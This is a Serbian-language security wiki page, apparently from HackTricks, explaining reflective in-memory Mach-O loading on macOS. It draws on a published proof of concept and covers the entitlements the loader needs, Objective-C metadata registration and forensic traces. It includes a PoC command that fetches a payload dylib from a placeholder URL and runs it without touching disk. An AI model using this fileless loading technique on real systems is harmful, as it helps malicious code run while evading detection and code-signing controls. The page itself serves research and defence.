# Рефлективно Mach-O учитавање на macOS

{{#include ../../../banners/hacktricks-training.md}}

Рефлективни loader мапира Mach-O слику из бајтова који су већ у његовом процесу, затим је повезује и покреће њене иницијализаторе, без тражења од системског loader-а да отвори payload датотеку. Ово је **извршавање кода унутар процеса**, а не примитив за ескалацију привилегија или убацивање у удаљени процес.<sup>[[2]](#references)</sup>

На новијим верзијама macOS-а, стари пут `NSCreateObjectFileImageFromMemory`/`NSLinkModule` уписује слику на диск. ReflectiveLoader уместо тога уграђује старији Apple-ов код за учитавање dyld-а; Wardle је ово демонстрирао на macOS 15 и 26.<sup>[[2]](#references)[[3]](#references)</sup>

Ако loader користи Hardened Runtime, његовом непотписаном коду у меморији потребан је изузетак који дозвољава извршавање меморије, као што су `com.apple.security.cs.allow-unsigned-executable-memory` или `com.apple.security.cs.disable-executable-page-protection`; у супротном, спровођење потписивања кода блокира извршавање. Ово је ограничење у погледу потписивања loader-а, а не примитив за ескалацију привилегија. Погледајте [референцу за macOS entitlements](../macos-security-protections/macos-dangerous-entitlements.md#comapplesecuritycsallow-unsigned-executable-memory).<sup>[[2]](#references)</sup>

За PoC наведите URL који служи raw Mach-O **bundle, framework или dylib**. Његов `main.mm` одбија празна преузимања и наводи да payload-и који користе `LC_DYLD_CHAINED_FIXUPS` нису подржани. Прихвата се и локална путања, али тај унос није ток рада без датотеке. URL облик чита бајтове у `NSData` и прослеђује његов бафер и дужину функцији `custom_dlopen_from_memory`.<sup>[[4]](#references)</sup>

```bash
./PoC 'https://example.invalid/payload.dylib'
```

Ugrađeni loader poziva `ImageLoaderMachO::instantiateFromMemory`, a zatim `image->link`. Registruje Objective-C metapodatke **nakon povezivanja, ali pre** `image->runInitializers`, koji izvršava konstruktore.<sup>[[5]](#references)</sup> Bez registracije, konstruktor koji šalje Objective-C poruku može da otkaže uz grešku `unrecognized selector sent to instance`.<sup>[[3]](#references)</sup> Pogledajte [uobičajeni tok učitavanja slike u dyld-u](macos-library-injection/macos-dyld-process.md#flow) i [referencu za Mach-O sekcije](../macos-files-folders-and-binaries/universal-binaries-and-mach-o-format.md#objective-c-common-sections).

## Aktiviranje Objective-C metapodataka

Za razliku od uobičajenog učitavanja u dyld-u, ugrađivanje starijeg image loader-a ne čini automatski Objective-C metapodatke payload-a dostupnim za `libobjc`.<sup>[[3]](#references)</sup> Prilagođeni LLVM JIT pristup skenira Objective-C sekcije `__DATA` i `__DATA_CONST` u mapiranoj slici, a zatim, pre pokretanja konstruktora, obavlja sledeće korake:<sup>[[1]](#references)[[5]](#references)[[6]](#references)</sup>

1. Prolazi kroz `__objc_selrefs` u koracima veličine `sizeof(SEL)`. Za svaki selector koji nije null, pribavlja njegovo ime pomoću `sel_getName`, prosleđuje ga funkciji `sel_registerName` i zamenjuje pokazivač u sekciji kanonskim `SEL`-om.
2. Prikuplja klase iz `__objc_classlist` i registruje ih pomoću `objc_readClassPair`, prvo razrešavajući zavisnosti nadklasa.
3. Preusmerava reference u `__objc_classrefs` i `__objc_superrefs` na registrovane klase ili metaklase i dodaje metode kategorija iz `__objc_catlist`.

Na primer, popravka selector-a u `ObjCRuntime.cpp` ekvivalentna je sledećem:<sup>[[6]](#references)</sup>

```objectivec
for (uint8_t *cursor = sectionStart;
     cursor < sectionStart + selRefsSectionSize;
     cursor += sizeof(SEL)) {
    SEL *selector = (SEL *)cursor;
    if (*selector == NULL) continue;
    *selector = sel_registerName(sel_getName(*selector));
}
```

PoC se oslanja na interno ponašanje Objective-C runtime-a i ne podržava sve funkcije Mach-O formata, pa je njegov registracioni kod referenca za implementaciju, a ne generički loader spreman za neposrednu upotrebu.<sup>[[1]](#references)[[4]](#references)[[6]](#references)</sup> Registracija je potrebna za Apple klase i metode na koje se upućuje, kao i za klase koje definiše payload.<sup>[[3]](#references)</sup>

U testovima autora, reflectively loaded image se ne pojavljuje u `dyld_all_image_infos`. Njegova anonimna izvršna mapiranja mogu se pojaviti kao neimenovane `dylib` oblasti u `vmmap`; uzorkovani stack frame-ovi mogu biti prikazani kao `<unknown binary>`. Ovo su smernice za inspekciju, a ne pouzdana atribucija ovom loader-u, a pristup informacijama o task-u drugog procesa ograničen je entitlement-ima. Pogledajte [macOS memory dumping](../macos-files-folders-and-binaries/macos-memory-dumping.md) za ograničenja pristupa procesima.<sup>[[3]](#references)</sup>

## References

- [1] [LLVM JIT, Objective-C i Swift na macOS-u: pregled znanja](https://stanislaw.github.io/2018-09-03-llvm-jit-objc-and-swift-knowledge-dump.html)
- [2] [Vraćanje reflective code loading-a na macOS (I deo)](https://objective-see.org/blog/blog_0x7C.html)
- [3] [Vraćanje reflective code loading-a na macOS (II deo)](https://objective-see.org/blog/blog_0x82.html)
- [4] [ReflectiveLoader PoC main.mm](https://github.com/pwardle/ReflectiveLoader/blob/main/PoC/PoC/main.mm)
- [5] [ReflectiveLoader custom_dlfcn.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/custom_dlfcn.cpp)
- [6] [ReflectiveLoader ObjCRuntime.cpp](https://github.com/pwardle/ReflectiveLoader/blob/main/loader/src/ObjCRuntime.cpp)
